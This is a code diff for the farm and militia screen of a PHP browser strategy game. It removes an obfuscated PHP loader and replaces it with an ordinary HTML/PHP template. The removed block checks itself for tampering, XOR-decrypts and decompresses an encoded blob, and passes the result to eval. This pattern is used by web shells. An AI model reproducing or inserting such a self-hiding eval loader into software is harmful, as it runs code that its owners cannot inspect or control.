@@ -1,24 +1,112 @@
-<?php
-$fukaageu="ebc2d8e921a08071620aa9349947f7b6";
-$ztewryuy="04520003535c0100025307080f070e040f51055103090b55015c575457025655";
-$znsufcpi="Geqmafr2/wEg3AntibRv/LekoILTFwEN4YUa4a3DjNYkOfNwvvQwewhRaa2Q/7KYHaft6J5o9i2u5m6Z2MuO3I9mIJlnJpXXx73mhnUS5GjK96gMuyFqh5j3CmdCvHAisxBCSKuw4F+0hzOIcIVlGjyoFGAmYSSgyFRhEk0KnzHoAcinUeGZoP2jhTY1c2wxGGt75WQthVwQ7+S+iWlEHF+vkYPTCC3IMbEAcc8fMzRJOUXAnHAQJAGbBAUUyY+2ksNT4V2qcLJR3xe+wi8ov0kFIKwPPXzesZ+1m23KDX2jdDlG319fPY7zKi0ma5ZjRqEUrqIxafOLbUlNUY7XgAs1RDijPBSQmsJCrB+1r2p9jW3JLti3jhEkE/equ9IQDL1iGHIxcfgzywanBuokh17XrBki+lFEqLOWY0ZUVA2ayUvgZEjckRkYB3s0GMPBPN4/9wJUlWxHfHAhspeB88Ws4jOUaC9J5I3rTXdESaQxxJUsaaLc5Op/8L5YSS9GKIHWT38SZ6tek6NT7CgaICYQgW/PZQX9hIVgO17q5OhQ8yz76PGjPd/u3FzIUmDmfiJve+upwgQRtuSC1Dm9Fm1lKeeeaWP7YjgBAFw25PnkMssrh3GnMHIXTcmu82pQw85k7e2d1akMCc6A/r3s3vtOz9FAev9jjqjgUEUSOg1ykBbAghWLouNd8YIgcI68Mpgmh+WH0d1+zgU8MFvCeddtRowen1emshc9oazdTpPP7oBAzyf22oALvLUahJJwStxJe/Fxh8QuxUxmDJpDzNJqSEhpkSdcvecpXqoCNn6ybA3xDOAyw+rgW19dxjSulb+1tLFcM84oXXqtP9CTCDC24tRGBjV/Ps97coA2Mi68eKXaiLHdd6wtheccQWQNoUpGr5lWwZB0BmnW6FQQjKUMc2v9OwRPu4m9DWyGdy4o42ieseY9f8Yvbd2yiUwI62TzMZmoGTufO2VgQcSmeO+HEw0Df6luFowycQ+pRIT9yaP8/rjWvOkxhoiVgqMAKKFxRm6+F2DazLF0K2qRHIlAVTGO9ES/6L2Xsmas0jexOhghRkC3pDXEeZOuNQLF2SKdpbdJCwE1UCB+GVe4yFnlREhM8l0rnaNY2Mo7j841YEtUQCsumxwjRj1bmLutOmGMSj6t/nY6Fev1pgbA+7BbAMnM2NROhocE0DzPVUjQGhsndqVPPEccHXv1c5S1Q3UPJ8kKEei6g8vOtovQP1E2OPckoVi4q+mNRqiTZkCuBQZ+RQ/jcmG7rEWE8lrKJAH4XkooazojYBhZQZuomoMCn2JtB+u4WBYZksjT0ACy+6PRcMxbLzuS38kGzyLukWa+dVFX+Z8/8Dq28g==";
-$yonjuvga=file_get_contents(__FILE__);
-$dlnbojqlvo=str_replace($znsufcpi,"",$yonjuvga);
-if(strpos($dlnbojqlvo,"ec"."ho")!==false||strpos($dlnbojqlvo,"pr"."int")!==false||strpos($dlnbojqlvo,"var_"."dump")!==false||strpos($dlnbojqlvo,"file_put_"."contents")!==false||strpos($dlnbojqlvo,"fw"."rite")!==false){die();}
-$azbvjobb=str_replace(array($fukaageu,$ztewryuy),array("SP_b9312a3f","KP_d25d91f9"),$yonjuvga);
-$htowovot=md5($azbvjobb);
-$ofygfzymbcbs=hex2bin($ztewryuy);
-$lscacxi="";
-$egmqabpdx=strlen($htowovot);
-for($hrciutwww=0;$hrciutwww<$egmqabpdx;$hrciutwww++){
-$lscacxi.=chr(ord($ofygfzymbcbs[$hrciutwww])^ord($htowovot[$hrciutwww]));
-}
-$tpogfav=base64_decode($znsufcpi);
-$cvfcfhsyy=strlen($tpogfav);
-$lhicnykk="";
-$dmrpauhm=strlen($lscacxi);
-for($hrciutwww=0;$hrciutwww<$cvfcfhsyy;$hrciutwww++){
-$lhicnykk.=$tpogfav[$hrciutwww]^$lscacxi[$hrciutwww%$dmrpauhm];
-}
-$bqjmpulnd="gzun"."compress";
-eval('?>' . $bqjmpulnd($lhicnykk) . '<?php ');
+<table>
+    <tr>
+        <td>
+            <img src="graphic/big_buildings/farm1.png" title="<?= __('screens.farm.farm') ?>" alt="" />
+        </td>
+        <td>
+            <h2><?= __('screens.farm.farm') ?> (<?= __('screens.common.level') ?> <?php echo $village['farm']; ?>)</h2>
+            <p><?= __('screens.farm.farm_description') ?>
+            </p>
+        </td>
+    </tr>
+</table>
+<br />
+
+<table width="100%">
+    <tr>
+        <td valign="top" width="300">
+            <img src="graphic/reports/militia.jpg" alt="Milícia">
+        </td>
+        <td valign="top">
+            <table class="vis" width="100%">
+                <tr>
+                    <th colspan="2"></span><?= __('screens.farm.max_population') ?></th>
+                </tr>
+                <tr>
+                    <td width="80%"><span class="icon header population"></span><?= __('screens.farm.max_population') ?>
+                    </td>
+                    <td align="right"><b><?php echo $max_bh; ?></b></td>
+                </tr>
+                <tr>
+                    <td><span class="icon header population"></span><?= __('screens.farm.max_population_at_level') ?>
+                        <?php echo $village['farm'] + 1; ?>
+                    </td>
+                    <td align="right"><b><?php echo $max_bh_next; ?></b></td>
+                </tr>
+            </table>
+            <br />
+            <table class="vis" width="100%">
+                <tr>
+                    <th colspan="2"><?= __('screens.farm.current_population') ?></th>
+                </tr>
+                <tr>
+                    <td width="80%"><?= __('screens.farm.buildings_construction_included') ?></td>
+                    <td align="right"><b><?php echo $buildings_bh; ?></b></td>
+                </tr>
+                <tr>
+                    <td><?= __('screens.farm.troops') ?></td>
+                    <td align="right"><b><?php echo $units_bh; ?></b></td>
+                </tr>
+                <tr>
+                    <td><?= __('screens.farm.troops_in_production') ?></td>
+                    <td align="right"><b>0</b></td>
+                </tr>
+                <tr>
+                    <th><?= __('screens.farm.all') ?></th>
+                    <th align="right"><?php echo $current_bh; ?></th>
+                </tr>
+            </table>
+            <br />
+            <table>
+                <tr>
+                    <th colspan="2"><img src="graphic/unit/unit_militia.png">
+                        <?= __('screens.farm.militia_in_village') ?></th>
+                </tr>
+                <td class="vis" width="100%">
+                    <table class="vis" width="100%">
+                        <td valign="top" width="100%">
+                            <p><?= __('screens.farm.militia_description') ?></p>
+                            <ul>
+                                <li><?= __('screens.farm.militia_effect_1') ?></li>
+                                <li><?= __('screens.farm.militia_effect_2') ?></li>
+                                <li><?= __('screens.farm.militia_effect_3') ?></li>
+                                <li style="color: #aa0000; font-weight: bold;">
+                                    <?= __('screens.farm.militia_effect_4') ?></li>
+                            </ul>
+
+                            <div style="text-align: center; margin-top: 10px;">
+                                <?php if ($error): ?>
+                                    <div class="error"><?php echo $error; ?></div>
+                                <?php endif; ?>
+
+                                <?php if ($militia_active): ?>
+                                    <p style="font-weight: bold; color: green;"><?= __('screens.farm.militia_active') ?></p>
+                                    <p><?= __('screens.farm.production_returns_in') ?> <span
+                                            class="timer"><?php echo format_time($militia_end_time - time()); ?></span></p>
+                                <?php else: ?>
+                                    <?php if ($villages_count > 2): ?>
+                                        <span class="inactive"><?= __('screens.farm.cannot_call_militia') ?></span>
+                                    <?php else: ?>
+                                        <form
+                                            action="game.php?village=<?php echo $village['id']; ?>&screen=farm&action=call_militia&h=<?php echo $hkey; ?>"
+                                            method="post">
+                                            <input type="submit" value="<?= __('screens.farm.call_militia') ?>" class="btn"
+                                                onclick="return confirm('<?= __('screens.farm.call_militia_confirm') ?>');">
+                                        </form>
+                                    <?php endif; ?>
+                                <?php endif; ?>
+                            </div>
+                        </td>
+                </td>
+            </table>
+
+        </td>
+</table>
+</td>
+</tr>
+</table>
+<br />
+
+<!-- Militia Section -->
+
+</div>
